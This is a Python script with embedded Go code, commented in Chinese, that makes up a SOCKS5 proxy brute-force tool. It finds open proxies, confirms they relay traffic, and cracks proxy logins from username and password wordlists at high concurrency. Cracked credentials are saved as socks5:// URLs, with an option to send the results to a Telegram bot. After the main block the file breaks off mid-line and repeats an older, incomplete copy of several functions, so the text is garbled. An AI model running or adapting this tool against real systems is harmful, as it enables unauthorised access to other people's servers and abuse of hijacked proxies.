import subprocess
import sys
import tempfile
import os
import shutil
import hashlib
import json
import time
from datetime import datetime
import getpass
import threading

# --- 依赖检查 ---
try:
    from tqdm import tqdm
except ImportError:
    print("错误: 缺少 'tqdm' 库。请运行 'pip install tqdm' 进行安装。")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("错误: 缺少 'requests' 库。请运行 'pip install requests' 进行安装。")
    sys.exit(1)


# --- GO 语言核心代码 1: SOCKS5 协议验证器 (快速) ---
GO_SOURCE_CODE_PROTOCOL_VERIFIER = r'''
package main
import ("bufio";"flag";"fmt";"net";"os";"strings";"sync";"time")
func verifyProtocol(target string, timeout time.Duration, results chan<- string) {
	conn, err := net.DialTimeout("tcp", target, timeout); if err != nil { results <- ""; return }; defer conn.Close()
	_, err = conn.Write([]byte{0x05, 0x01, 0x00}); if err != nil { results <- ""; return }
	resp := make([]byte, 2); conn.SetReadDeadline(time.Now().Add(timeout)); n, err := conn.Read(resp)
	if err == nil && n == 2 && resp[0] == 0x05 && resp[1] == 0x00 { results <- target } else { results <- "" }
}
func main() {
	inputFile := flag.String("inputFile", "", ""); outputFile := flag.String("outputFile", "", ""); threads := flag.Int("threads", 100, ""); timeout := flag.Int("timeout", 10, ""); flag.Parse()
	if *inputFile == "" || *outputFile == "" { os.Exit(1) }
	file, _ := os.Open(*inputFile); defer file.Close(); scanner := bufio.NewScanner(file); var targets []string
	for scanner.Scan() { t := strings.TrimSpace(scanner.Text()); if t!=""{targets=append(targets, t)} }
	outFile, _ := os.Create(*outputFile); defer outFile.Close(); writer := bufio.NewWriter(outFile)
	results := make(chan string, *threads); var wg sync.WaitGroup; wg.Add(1)
	go func() { defer wg.Done(); for r := range results { if r != "" { fmt.Println(r); fmt.Fprintln(writer, r); writer.Flush() } } }()
	var workerWg sync.WaitGroup; sem := make(chan struct{}, *threads)
	for _, target := range targets { workerWg.Add(1); sem <- struct{}{}; go func(t string) { defer workerWg.Done(); verifyProtocol(t, time.Duration(*timeout)*time.Second, results); <-sem }(target) }
	workerWg.Wait(); close(results); wg.Wait()
}
'''

# --- GO 语言核心代码 2: SOCKS5 深度连接验证器 ---
GO_SOURCE_CODE_DEEP_VERIFIER = r'''
package main
import ("bufio";"encoding/binary";"flag";"fmt";"net";"os";"strings";"sync";"time")
func verifyProxyConnectivity(target string, timeout time.Duration, results chan<- string) {
	conn, err := net.DialTimeout("tcp", target, timeout); if err != nil { results <- ""; return }; defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	_, err = conn.Write([]byte{0x05, 0x01, 0x00}); if err != nil { results <- ""; return }
	resp := make([]byte, 2); n, err := conn.Read(resp)
	if err != nil || n != 2 || resp[0] != 0x05 || resp[1] != 0x00 { results <- ""; return }
	destHost := "www.google.com"; destPort := 80
	req := []byte{0x05, 0x01, 0x00, 0x03}; req = append(req, byte(len(destHost))); req = append(req, destHost...)
	portBytes := make([]byte, 2); binary.BigEndian.PutUint16(portBytes, uint16(destPort)); req = append(req, portBytes...)
	_, err = conn.Write(req); if err != nil { results <- ""; return }
	reply := make([]byte, 10); n, err = conn.Read(reply)
	if err != nil || n < 4 { results <- ""; return }
	if reply[1] == 0x00 { results <- target } else { results <- "" }
}
func main() {
	inputFile := flag.String("inputFile", "", ""); outputFile := flag.String("outputFile", "", ""); threads := flag.Int("threads", 100, ""); timeout := flag.Int("timeout", 10, ""); flag.Parse()
	if *inputFile == "" || *outputFile == "" { os.Exit(1) }
	file, _ := os.Open(*inputFile); defer file.Close(); scanner := bufio.NewScanner(file); var targets []string
	for scanner.Scan() { t := strings.TrimSpace(scanner.Text()); if t!=""{targets=append(targets, t)} }
	outFile, _ := os.Create(*outputFile); defer outFile.Close(); writer := bufio.NewWriter(outFile)
	results := make(chan string, *threads); var wg sync.WaitGroup; wg.Add(1)
	go func() { defer wg.Done(); for r := range results { if r != "" { fmt.Println(r); fmt.Fprintln(writer, r); writer.Flush() } } }()
	var workerWg sync.WaitGroup; sem := make(chan struct{}, *threads)
	for _, target := range targets { workerWg.Add(1); sem <- struct{}{}; go func(t string) { defer workerWg.Done(); verifyProxyConnectivity(t, time.Duration(*timeout)*time.Second, results); <-sem }(target) }
	workerWg.Wait(); close(results); wg.Wait()
}
'''

# --- GO 语言核心代码 3: 高性能 Worker Pool 认证扫描器 (优化版) ---
GO_SOURCE_CODE_SCANNER = r'''
package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Job 结构体减少闭包内存占用
type Job struct {
	Host string
	Port string
	User string
	Pass string
}

func checkAuth(job Job, timeout time.Duration) bool {
	target := net.JoinHostPort(job.Host, job.Port)
	conn, err := net.DialTimeout("tcp", target, timeout)
	if err != nil { return false }
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	// 1. 握手 (支持无认证和用户密码认证)
	_, err = conn.Write([]byte{0x05, 0x02, 0x00, 0x02}) 
	if err != nil { return false }
	
	reply := make([]byte, 2)
	_, err = conn.Read(reply)
	if err != nil || reply[0] != 0x05 { return false }

	// 2. 认证逻辑
	if reply[1] == 0x00 {
		// 无需认证 (Open Proxy)
		// 如果我们原本准备了账号密码，却发现无需认证，视为成功但标记为无认证
		return true 
	} else if reply[1] == 0x02 {
		// 需要账号密码
		if job.User == "" && job.Pass == "" { return false }
		
		userBytes := []byte(job.User)
		passBytes := []byte(job.Pass)
		req := append([]byte{0x01, byte(len(userBytes))}, userBytes...)
		req = append(req, byte(len(passBytes)))
		req = append(req, passBytes...)
		
		_, err = conn.Write(req)
		if err != nil { return false }
		
		authReply := make([]byte, 2)
		_, err = conn.Read(authReply)
		if err == nil && authReply[0] == 0x01 && authReply[1] == 0x00 {
			return true
		}
	}
	return false
}

func worker(id int, jobs <-chan Job, timeout int, wg *sync.WaitGroup, counter *uint64) {
	defer wg.Done()
	t := time.Duration(timeout) * time.Second
	localCount := 0
	
	for job := range jobs {
		success := checkAuth(job, t)
		
		if success {
			// S|host:port|user|pass
			fmt.Printf("S|%s:%s|%s|%s\n", job.Host, job.Port, job.User, job.Pass)
		}

		// 进度汇报: 减少IO频率，每50次检查或成功时打印一次进度标记
		localCount++
		if localCount >= 50 {
			atomic.AddUint64(counter, uint64(localCount))
			fmt.Println("P") // P 代表 Progress Tick (Batch)
			localCount = 0
		}
	}
	// 处理剩余的计数
	if localCount > 0 {
		atomic.AddUint64(counter, uint64(localCount))
		fmt.Println("P")
	}
}

func main() {
	proxyFile := flag.String("proxyFile", "", "Proxies")
	dictFile := flag.String("dictFile", "", "Credentials")
	threads := flag.Int("threads", 500, "Worker threads")
	timeout := flag.Int("timeout", 5, "Timeout")
	flag.Parse()

	// 1. 读取文件
	pData, _ := os.ReadFile(*proxyFile)
	pLines := strings.Split(string(pData), "\n")
	var proxies []string
	for _, l := range pLines { if t := strings.TrimSpace(l); t != "" { proxies = append(proxies, t) } }

	dData, _ := os.ReadFile(*dictFile)
	dLines := strings.Split(string(dData), "\n")
	
	// 2. 预处理凭证 (Credential)
	type Cred struct { U, P string }
	var creds []Cred
	// 默认包含空凭证以检测无需认证的情况 (可选，视需求而定，这里为了匹配Python逻辑暂时保留或移除)
	// 这里我们严格按照 dictFile 来。如果是空文件，则不跑。
	for _, l := range dLines {
		l = strings.TrimSpace(l)
		if l == "" { continue }
		parts := strings.SplitN(l, ":", 2)
		if len(parts) == 2 { creds = append(creds, Cred{parts[0], parts[1]}) }
	}
	if len(creds) == 0 { creds = append(creds, Cred{"", ""}) } // 至少跑一次无认证

	// 3. 启动 Workers
	jobs := make(chan Job, *threads * 2) // 带缓冲的 Channel
	var wg sync.WaitGroup
	var counter uint64

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go worker(i, jobs, *timeout, &wg, &counter)
	}

	// 4. 发送任务 (生成器模式，节省内存)
	// 逻辑：外层循环代理，内层循环密码
	go func() {
		for _, proxy := range proxies {
			parts := strings.Split(proxy, ":")
			if len(parts) != 2 { continue }
			h, p := parts[0], parts[1]
			
			for _, c := range creds {
				jobs <- Job{Host: h, Port: p, User: c.U, Pass: c.P}
			}
		}
		close(jobs)
	}()

	wg.Wait()
}
'''

# --- Python 包装器 ---

COMPILED_BINARIES = {}
CACHE_DIR = ".socks5_toolkit_cache"
CONFIG_FILE = "config.json"

# --- 配置管理 ---
def load_config():
    if not os.path.exists(CONFIG_FILE):
        default_config = {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}
        save_config(default_config)
        return default_config
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=4)

def handle_config_menu(config):
    while True:
        print_header("设置菜单")
        print(f"  [1] Bot Token:         {'*' * 10 if config.get('bot_token') else '未设置'}")
        print(f"  [2] Chat ID:           {config.get('chat_id') or '未设置'}")
        print(f"  [3] 自定义标识名:    {config.get('custom_id_key') or 'VPS'}")
        print(f"  [4] 自定义标识值:    {config.get('custom_id_value') or '未设置'}")
        print("\n  [b] 返回主菜单")
        
        choice = input("\n请选择要修改的项: ").lower()
        if choice == '1':
            config['bot_token'] = getpass.getpass("请输入新的 Telegram Bot Token (输入隐藏): ")
        elif choice == '2':
            config['chat_id'] = input("请输入新的 Chat ID: ")
        elif choice == '3':
            config['custom_id_key'] = input(f"请输入新的标识名 (当前: {config.get('custom_id_key', 'VPS')}): ")
        elif choice == '4':
            config['custom_id_value'] = input(f"请输入新的标识值 (当前: {config.get('custom_id_value')}): ")
        elif choice == 'b':
            break
        save_config(config)
        print("设置已保存！")

# --- 核心功能 ---
def print_header(title):
    print("\n" + "="*60); print(f"--- {title} ---"); print("="*60)

def get_validated_input(prompt, validation_func=lambda x: True, error_message="无效输入"):
    while True:
        user_input = input(prompt).strip()
        if validation_func(user_input): return user_input
        else: print(f"输入错误: {error_message}")

def validate_file_exists(path): return os.path.exists(path)
def validate_positive_integer(num_str): return num_str.isdigit() and int(num_str) > 0

def get_go_executable_path():
    go_exec = shutil.which("go")
    if go_exec: return go_exec
    common_paths = ["/usr/local/go/bin/go", "/usr/bin/go", "C:\\Go\\bin\\go.exe"]
    for path in common_paths:
        if os.path.exists(path): return path
    return None

def compile_go_binaries():
    global COMPILED_BINARIES
    go_executable = get_go_executable_path()
    if not go_executable:
        print("\n错误: 未找到 'go' 命令。请确保 Go 环境已正确安装并配置在系统 PATH 中。")
        return False

    os.makedirs(CACHE_DIR, exist_ok=True); print("正在初始化高速扫描核心...")
    sources = {
        "protocol_verifier": GO_SOURCE_CODE_PROTOCOL_VERIFIER,
        "deep_verifier": GO_SOURCE_CODE_DEEP_VERIFIER,
        "scanner": GO_SOURCE_CODE_SCANNER,
    }
    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            for name, code in sources.items():
                current_hash = hashlib.sha256(code.encode('utf-8')).hexdigest()
                exe_name = f"{name}.exe" if sys.platform == "win32" else name
                output_path = os.path.join(CACHE_DIR, exe_name)
                hash_path = os.path.join(CACHE_DIR, f"{name}.hash")
                recompile = True
                if os.path.exists(output_path) and os.path.exists(hash_path):
                    with open(hash_path, 'r') as f: stored_hash = f.read()
                    if stored_hash == current_hash: recompile = False
                if recompile:
                    print(f"  - 编译 '{name}' (Go)...")
                    source_path = os.path.join(temp_dir, f"{name}.go")
                    with open(source_path, "w", encoding="utf-8") as f: f.write(code)
                    cmd = [go_executable, "build", "-ldflags", "-s -w", "-o", output_path, source_path] # -s -w 减小体积
                    
                    build_env = os.environ.copy()
                    if "HOME" not in build_env and "USERPROFILE" not in build_env:
                        go_cache_path = os.path.join(temp_dir, "gocache_for_build")
                        os.makedirs(go_cache_path, exist_ok=True)
                        build_env["GOCACHE"] = go_cache_path
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, env=build_env)
                    if result.returncode != 0:
                         print(f"\nGo程序编译失败: {name}\n{result.stderr}"); return False
                    with open(hash_path, 'w') as f: f.write(current_hash)
                COMPILED_BINARIES[name] = output_path
        print("Go核心程序准备就绪。"); return True
    except Exception as e: print(f"\n发生未知错误: {e}"); return False

def run_go_scanner_optimized(executable_name, cmd_args, total_tasks, result_file_path):
    executable_path = COMPILED_BINARIES.get(executable_name)
    if not executable_path: return

    print(f"\n--- 启动高并发 Worker Pool (任务总量: {total_tasks}) ---")
    cmd = [executable_path] + cmd_args
    
    success_count = 0
    open_count = 0

    try:
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, encoding='utf-8', errors='replace', bufsize=1
        )

        with tqdm(total=total_tasks, unit="chk", dynamic_ncols=True, desc="爆破进度") as pbar:
            with open(result_file_path, 'w', encoding='utf-8') as f_out:
                while True:
                    line = process.stdout.readline()
                    if not line and process.poll() is not None:
                        break
                    if not line:
                        continue
                    
                    line = line.strip()
                    if line == "P":
                        pbar.update(50) # 对应 Go 代码中的 batch size
                    elif line.startswith("S|"):
                        # Success format: S|host:port|user|pass
                        parts = line.split("|")
                        if len(parts) >= 4:
                            target, user, pwd = parts[1], parts[2], parts[3]
                            if user == "" and pwd == "":
                                msg = f"[!] 开放代理: {target}"
                                open_count += 1
                                # 记录为无密码格式
                                f_out.write(f"{target}\n")
                            else:
                                msg = f"[+] 成功拿到: {target} ({user}:{pwd})"
                                success_count += 1
                                # 记录为原始格式，稍后合并
                                f_out.write(f"{target}:{user}:{pwd}\n")
                            
                            tqdm.write(msg) # 在进度条上方打印，不破坏进度条
                            f_out.flush()

        print(f"\n扫描完成。命中: {success_count}, 开放: {open_count}")
        
    except KeyboardInterrupt:
        print("\n用户中断任务。正在终止后台进程...")
        process.kill()
    except Exception as e:
        print(f"运行时错误: {e}")

def run_go_executable(executable_name, args_list, pbar_desc="处理中"):
    executable_path = COMPILED_BINARIES.get(executable_name)
    if not executable_path: return

    try:
        cmd = [executable_path] + args_list
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='utf-8', errors='replace')

        def reader_thread(pipe, output_list, pbar=None):
            try:
                for line in iter(pipe.readline, ''):
                    if line:
                        output_list.append(line)
                        if pbar: pbar.update(1)
            finally:
                pipe.close()
        
        stdout_output = []
        with tqdm(desc=pbar_desc, unit=" 个", dynamic_ncols=True) as pbar:
            t = threading.Thread(target=reader_thread, args=(process.stdout, stdout_output, pbar))
            t.start(); t.join()
        process.wait()
    except Exception as e: print(f"执行Go程序时出错: {e}")

def create_dict_from_user_pass_files(temp_dir):
    print_header("模式: username.txt + password.txt")
    user_file = get_validated_input("请输入用户名文件: ", validate_file_exists, "文件不存在。")
    pass_file = get_validated_input("请输入密码文件: ", validate_file_exists, "文件不存在。")
    try:
        with open(user_file, 'r', encoding='utf-8', errors='ignore') as f: users = [l.strip() for l in f if l.strip()]
        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f: passwords = [l.strip() for l in f if l.strip()]
        temp_path = os.path.join(temp_dir, 'combined_dict.txt')
        with open(temp_path, 'w', encoding='utf-8') as f:
            for u in users:
                for p in passwords: f.write(f"{u}:{p}\n")
        return temp_path, len(users) * len(passwords)
    except: return None, 0

def create_dict_from_same_user_pass(temp_dir):
    print_header("模式: 用户名和密码相同")
    f_path = get_validated_input("请输入单词本文件: ", validate_file_exists, "文件不存在。")
    try:
        with open(f_path, 'r', encoding='utf-8', errors='ignore') as f: words = [l.strip() for l in f if l.strip()]
        temp_path = os.path.join(temp_dir, 'same_dict.txt')
        with open(temp_path, 'w', encoding='utf-8') as f:
            for w in words: f.write(f"{w}:{w}\n")
        return temp_path, len(words)
    except: return None, 0

def count_lines(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f: return sum(1 for line in f if line.strip())
    except: return 0

def finalize_results(raw_result_file, output_dir):
    """读取原始输出，去重，并生成 socks5:// 格式的最终大文件"""
    if not os.path.exists(raw_result_file): return None
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    final_file = os.path.join(output_dir, f"All_Socks5_Result_{timestamp}.txt")
    
    unique_proxies = set()
    count = 0
    
    with open(raw_result_file, 'r', encoding='utf-8') as fin, \
         open(final_file, 'w', encoding='utf-8') as fout:
        
        for line in fin:
            line = line.strip()
            if not line: continue
            
            # 格式可能是 "ip:port:user:pass" 或者 "ip:port" (open)
            parts = line.split(':')
            
            formatted = ""
            if len(parts) == 4: # host:port:user:pass
                host, port, user, pwd = parts[0], parts[1], parts[2], parts[3]
                formatted = f"socks5://{user}:{pwd}@{host}:{port}"
            elif len(parts) == 2: # host:port (open proxy)
                host, port = parts[0], parts[1]
                formatted = f"socks5://{host}:{port}"
            else:
                continue # 格式无法识别
            
            if formatted not in unique_proxies:
                unique_proxies.add(formatted)
                fout.write(formatted + "\n")
                count += 1
    
    print(f"\n[OK] 结果已整合! 共 {count} 个唯一可用节点。")
    print(f"     保存路径: {final_file}")
    return final_file

def handle_auth_scan(output_dir, config):
    dict_path = None
    cred_count = 0
    temp_dir = tempfile.mkdtemp()

    try:
        print_header("私有代理认证爆破")
        print("  [1] 组合模式 (user.txt + pass.txt)")
        print("  [2] 同名模式 (user = pass)")
        print("  [3] 标准模式 (user:pass 文件)")
        choice = input("\n请选择: ").lower()

        if choice == '1': dict_path, cred_count = create_dict_from_user_pass_files(temp_dir)
        elif choice == '2': dict_path, cred_count = create_dict_from_same_user_pass(temp_dir)
        elif choice == '3':
            dict_path = get_validated_input("文件路径: ", validate_file_exists)
            cred_count = count_lines(dict_path)
        else: return
        
        if not dict_path or cred_count == 0: print("密码本生成失败或为空。"); return

        proxy_file = get_validated_input("代理文件 (host:port): ", validate_file_exists)
        proxy_count = count_lines(proxy_file)
        if proxy_count == 0: return

        # 智能设置线程
        default_threads = "800"
        threads = get_validated_input(f"并发数 (默认{default_threads}): ", lambda x: x=="" or validate_positive_integer(x), "") or default_threads
        timeout = get_validated_input("超时(秒, 默认3): ", lambda x: x=="" or validate_positive_integer(x), "") or "3"
        
        total_tasks = proxy_count * cred_count
        raw_output = os.path.join(temp_dir, "raw_results.txt")
        
        start_time = time.time()
        run_go_scanner_optimized("scanner", ["-proxyFile", proxy_file, "-dictFile", dict_path, "-threads", threads, "-timeout", timeout], total_tasks, raw_output)
        duration = time.time() - start_time
        
        final_file = finalize_results(raw_output, output_dir)
        
        if final_file:
            send_telegram_notification(config, final_file, proxy_count, duration)
        
    finally:
        shutil.rmtree(temp_dir)

# --- TG 通知 (保持原样) ---
def format_duration(seconds):
    return f"{int(seconds)//60}分{int(seconds)%60}秒"

def send_telegram_notification(config, file_path, total_targets, duration_seconds):
    if not config.get("bot_token") or not config.get("chat_id"): return
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0: return
    
    choice = input(f"\n是否将结果发送到 Telegram? (y/n): ").lower()
    if choice != 'y': return

    try:
        url = f"https://api.telegram.org/bot{config['bot_token']}/sendDocument"
        caption = f"{config.get('custom_id_key','VPS')}: {config.get('custom_id_value','Unset')}\n目标数: {total_targets}\n耗时: {format_duration(duration_seconds)}"
        with open(file_path, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': config['chat_id'], 'caption': caption}, timeout=30)
        print("Telegram 发送成功。")
    except Exception as e: print(f"Telegram 发送失败: {e}")

# --- 主逻辑 ---
def execute_scan_task(config, output_dir, mode):
    modes = {"protocol": ("_protocol", "验证协议"), "deep": ("_deep", "验证连通性")}
    suffix, title = modes[mode]
    print_header(title)
    
    f_path = get_validated_input("输入文件: ", validate_file_exists)
    count = count_lines(f_path)
    if count == 0: return

    out_file = os.path.join(output_dir, f"{os.path.splitext(os.path.basename(f_path))[0]}{suffix}.txt")
    threads = get_validated_input("并发数 (默认500): ", lambda x:x=="" or validate_positive_integer(x),"") or "500"
    
    st = time.time()
    run_go_executable(mode+"_verifier", ["-inputFile", f_path, "-outputFile", out_file, "-threads", threads, "-timeout", "5"], f"扫描中 ({count})")
    
    # 结果处理
    if os.path.exists(out_file) and os.path.getsize(out_file) > 0:
        final_merged = finalize_results(out_file, output_dir) # 统一格式化
        send_telegram_notification(config, final_merged, count, time.time() - st)
    else:
        print("未发现有效代理。")

def main():
    if not compile_go_binaries(): sys.exit(1)
    config = load_config()
    output_dir = f"Result_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(output_dir, exist_ok=True)
    
    print("\n" + "*"*50); print("SOCKS5 极速爆破工具 (Pro Optimized)"); print("*"*50)

    while True:
        print("\n[1] 快速协议筛选 (Protocol Check)")
        print("[2] 深度连通性验证 (Deep Check)")
        print("[3] 私有认证爆破 (Auth Crack)")
        print("[4] 设置 (Config)")
        print("[q] 退出")
        c = input("\n选择: ").lower()
        if c == '1': execute_scan_task(config, output_dir, "protocol")
        elif c == '2': execute_scan_task(config, output_dir, "deep")
        elif c == '3': handle_auth_scan(output_dir, config)
        elif c == '4': handle_config_menu(config)
        elif c == 'q': break
        else: print("无效选择")

if __name__ == "__main__":
    main()h.exists(CONFIG_FILE):
        default_config = {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}
        save_config(default_config)
        return default_config
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return {"bot_token": "", "chat_id": "", "custom_id_key": "VPS", "custom_id_value": ""}

def save_config(config):
    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
        json.dump(config, f, indent=4)

def handle_config_menu(config):
    while True:
        print_header("设置菜单")
        print(f"  [1] Bot Token:         {'*' * 10 if config.get('bot_token') else '未设置'}")
        print(f"  [2] Chat ID:           {config.get('chat_id') or '未设置'}")
        print(f"  [3] 自定义标识名:    {config.get('custom_id_key') or 'VPS'}")
        print(f"  [4] 自定义标识值:    {config.get('custom_id_value') or '未设置'}")
        print("\n  [b] 返回主菜单")
        
        choice = input("\n请选择要修改的项: ").lower()
        if choice == '1':
            config['bot_token'] = getpass.getpass("请输入新的 Telegram Bot Token (输入隐藏): ")
        elif choice == '2':
            config['chat_id'] = input("请输入新的 Chat ID: ")
        elif choice == '3':
            config['custom_id_key'] = input(f"请输入新的标识名 (当前: {config.get('custom_id_key', 'VPS')}): ")
        elif choice == '4':
            config['custom_id_value'] = input(f"请输入新的标识值 (当前: {config.get('custom_id_value')}): ")
        elif choice == 'b':
            break
        else:
            print("无效输入。")
            continue
        save_config(config)
        print("设置已保存！")

# --- 核心功能 ---
def print_header(title):
    print("\n" + "="*50); print(f"--- {title} ---"); print("="*50)

def get_validated_input(prompt, validation_func=lambda x: True, error_message="无效输入"):
    while True:
        user_input = input(prompt).strip()
        if validation_func(user_input): return user_input
        else: print(f"输入错误: {error_message}")

def validate_file_exists(path): return os.path.exists(path)
def validate_positive_integer(num_str): return num_str.isdigit() and int(num_str) > 0

def get_go_executable_path():
    go_exec = shutil.which("go")
    if go_exec: return go_exec
    common_paths = ["/usr/local/go/bin/go", "/usr/bin/go", "C:\\Go\\bin\\go.exe"]
    for path in common_paths:
        if os.path.exists(path): return path
    return None

def compile_go_binaries():
    global COMPILED_BINARIES
    go_executable = get_go_executable_path()
    if not go_executable:
        print("\n错误: 未找到 'go' 命令。请确保 Go 环境已正确安装并配置在系统 PATH 中。")
        return False

    os.makedirs(CACHE_DIR, exist_ok=True); print("正在检查Go核心程序...")
    sources = {
        "protocol_verifier": GO_SOURCE_CODE_PROTOCOL_VERIFIER,
        "deep_verifier": GO_SOURCE_CODE_DEEP_VERIFIER,
        "scanner": GO_SOURCE_CODE_SCANNER,
    }
    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            for name, code in sources.items():
                current_hash = hashlib.sha256(code.encode('utf-8')).hexdigest()
                exe_name = f"{name}.exe" if sys.platform == "win32" else name
                output_path = os.path.join(CACHE_DIR, exe_name)
                hash_path = os.path.join(CACHE_DIR, f"{name}.hash")
                recompile = True
                if os.path.exists(output_path) and os.path.exists(hash_path):
                    with open(hash_path, 'r') as f: stored_hash = f.read()
                    if stored_hash == current_hash: recompile = False
                if recompile:
                    print(f"  - 正在编译 '{name}'...")
                    source_path = os.path.join(temp_dir, f"{name}.go")
                    with open(source_path, "w", encoding="utf-8") as f: f.write(code)
                    cmd = [go_executable, "build", "-o", output_path, source_path]
                    
                    build_env = os.environ.copy()
                    if "HOME" not in build_env and "USERPROFILE" not in build_env:
                        go_cache_path = os.path.join(temp_dir, "gocache_for_build")
                        os.makedirs(go_cache_path, exist_ok=True)
                        build_env["GOCACHE"] = go_cache_path
                        print(f"  - 提示: 未找到HOME/USERPROFILE，已临时设置GOCACHE: {go_cache_path}")
                    
                    result = subprocess.run(cmd, capture_output=True, text=True, env=build_env)
                    if result.returncode != 0:
                         print(f"\nGo程序编译失败: {name}\n{result.stderr}")
                         return False

                    with open(hash_path, 'w') as f: f.write(current_hash)
                    print(f"  - '{name}' 编译完成。")
                else:
                    print(f"  - 使用缓存的 '{name}'。")
                COMPILED_BINARIES[name] = output_path
        print("Go核心程序准备就绪。"); return True
    except Exception as e: print(f"\n发生未知错误: {e}"); return False


# ... (脚本的其他部分保持不变) ...

def run_go_executable(executable_name, args_list, pbar_desc="已找到"):
    executable_path = COMPILED_BINARIES.get(executable_name)
    if not executable_path:
        print(f"错误: 未找到 '{executable_name}' 程序。")
        return

    try:
        cmd = [executable_path] + args_list
        print("\n--- 正在执行 Go 高性能核心 (健壮模式) ---")
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True, encoding='utf-8', errors='replace'
        )

        # 为 stdout 和 stderr 创建独立的读取线程，防止死锁
        def reader_thread(pipe, output_list, pbar=None):
            try:
                for line in iter(pipe.readline, ''):
                    if line:
                        output_list.append(line)
                        if pbar:
                            # 只有主输出才更新进度条
                            pbar.update(1)
                        else:
                            # 错误流直接打印
                            print(line.strip(), file=sys.stderr)
            finally:
                pipe.close()
        
        stdout_output = []
        stderr_output = []

        if "verifier" in executable_name:
            with tqdm(desc=pbar_desc, unit=" 个", dynamic_ncols=True) as pbar:
                stdout_thread = threading.Thread(target=reader_thread, args=(process.stdout, stdout_output, pbar))
                stderr_thread = threading.Thread(target=reader_thread, args=(process.stderr, stderr_output, None))
                
                stdout_thread.start()
                stderr_thread.start()
                
                stdout_thread.join() # 等待线程结束
                stderr_thread.join()
        else: # 认证扫描器模式，直接打印
            def print_pipe(pipe):
                try:
                    for line in iter(pipe.readline, ''):
                        print(line.strip())
                finally:
                    pipe.close()

            stdout_thread = threading.Thread(target=print_pipe, args=(process.stdout,))
            stderr_thread = threading.Thread(target=print_pipe, args=(process.stderr,))
            stdout_thread.start()
            stderr_thread.start()
            stdout_thread.join()
            stderr_thread.join()

        process.wait() # 确保子进程完全退出

        if "verifier" in executable_name:
            print("\n--- 任务执行完毕 ---")
            
    except Exception as e:
        print(f"执行Go程序时出错: {e}")


def create_dict_from_user_pass_files(temp_dir):
    print_header("模式: username.txt + password.txt")
    user_file = get_validated_input("请输入用户名文件 (username.txt): ", validate_file_exists, "文件不存在。")
    pass_file = get_validated_input("请输入密码文件 (password.txt): ", validate_file_exists, "文件不存在。")

    try:
        with open(user_file, 'r', encoding='utf-8', errors='ignore') as f_user:
            users = [line.strip() for line in f_user if line.strip()]
        with open(pass_file, 'r', encoding='utf-8', errors='ignore') as f_pass:
            passwords = [line.strip() for line in f_pass if line.strip()]
        
        temp_dict_path = os.path.join(temp_dir, 'combined_dict.txt')
        with open(temp_dict_path, 'w', encoding='utf-8') as f_out:
            for user in users:
                for password in passwords:
                    f_out.write(f"{user}:{password}\n")
        print(f"已生成 {len(users) * len(passwords)} 条密码组合到临时文件。")
        return temp_dict_path
    except Exception as e:
        print(f"创建密码本时出错: {e}")
        return None

def create_dict_from_same_user_pass(temp_dir):
    print_header("模式: 用户名和密码相同")
    wordlist_file = get_validated_input("请输入单词本文件 (例如: user.txt): ", validate_file_exists, "文件不存在。")
    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f_in:
            words = [line.strip() for line in f_in if line.strip()]
        
        temp_dict_path = os.path.join(temp_dir, 'same_user_pass_dict.txt')
        with open(temp_dict_path, 'w', encoding='utf-8') as f_out:
            for word in words:
                f_out.write(f"{word}:{word}\n")
        print(f"已根据 {len(words)} 个单词生成同名密码组合到临时文件。")
        return temp_dict_path
    except Exception as e:
        print(f"创建密码本时出错: {e}")
        return None

def handle_auth_scan(output_dir):
    dict_file_path = None
    temp_dir_for_dict = tempfile.mkdtemp()

    try:
        while True:
            print_header("私有代理认证扫描 - 密码本模式选择")
            print("  [1] 组合模式 (username.txt + password.txt)")
            print("  [2] 同名模式 (username = password)")
            print("  [3] 标准模式 (单文件 user:pass 或 user pass)")
            print("  [b] 返回上级菜单")
            choice = input("\n请选择密码本模式: ").lower()

            if choice == '1':
                dict_file_path = create_dict_from_user_pass_files(temp_dir_for_dict)
                break
            elif choice == '2':
                dict_file_path = create_dict_from_same_user_pass(temp_dir_for_dict)
                break
            elif choice == '3':
                print_header("模式: 标准密码本")
                dict_file_path = get_validated_input("请输入密码本路径 (user:pass格式): ", validate_file_exists, "文件不存在。")
                break
            elif choice == 'b':
                return
            else:
                print("无效输入。")
        
        if not dict_file_path:
            print("未能生成或指定密码本，任务取消。")
            return

        proxy_file = get_validated_input("请输入代理文件 (host:port): ", validate_file_exists, "文件不存在。")
        threads = get_validated_input("并发数 (默认100): ", lambda x: x=="" or validate_positive_integer(x), "") or "100"
        timeout = get_validated_input("超时(秒, 默认5): ", lambda x: x=="" or validate_positive_integer(x), "") or "5"
        
        base, ext = os.path.splitext(os.path.basename(proxy_file))
